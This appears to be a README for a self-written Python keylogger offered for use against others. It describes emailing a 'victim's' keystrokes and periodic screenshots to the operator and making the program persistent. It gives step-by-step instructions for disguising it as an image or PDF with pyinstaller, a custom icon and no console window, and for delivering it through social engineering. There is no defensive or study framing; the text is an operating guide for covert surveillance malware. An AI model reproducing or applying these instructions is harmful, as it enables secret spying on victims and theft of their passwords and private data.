# Keylogger
This has a keylogger created by me which can be packaged in anything, any file you want and by social engineering you can use it. <br />
This keylogger sends feedback via email and it sends the key pressed as well as a screenshot of the victim pc in a certain time interval. <br /> <br />
How to use: <br />
--> For this to work you have to enable the 'less secure apps' function on the email you want to use in keylogger.
You can search that in security settings of your gmail account<br /><br />
--> So to use this as python file its all ready but to package it into image or anything you have to use 'pyinstaller' script which you can download via pip. <br />
And at this time I am using pyinstaller==3.5 (version) that is running errorless for me. <br /><br />
--> To package this into image/pdf/anything you have to first edit the 'Keylogger.py' file and erase the '#' in line 34   i.e. '#self.check_file()' into 'self.check_file()' <br />
For more info on pyinstaller visit 'https://pyinstaller.readthedocs.io/en/stable/usage.html'.
After Packaging it will become persistant too.<br /><br />
--> The command of pyinstaller require to use for this file is as:<br />
'C:/Python27/Scripts/pyinstaller.exe --add-data "@'location of file'@;." --icon "@'location of icon'@" --onefile --noconsole keylogger.py'<br /><br />
--> __Ignore the @. these are just to distinguish__<br /><br />
--> 'location of file' = location of file you want that to turn with extension.<br />
'location of icon' = location of icon you want to add to file with '.ico' extension.<br /><br />
--> And in line 49 you have to add the name of file you added in pyinstaller. Eg:- 'image.jpg' or 'example.pdf' or anything like that
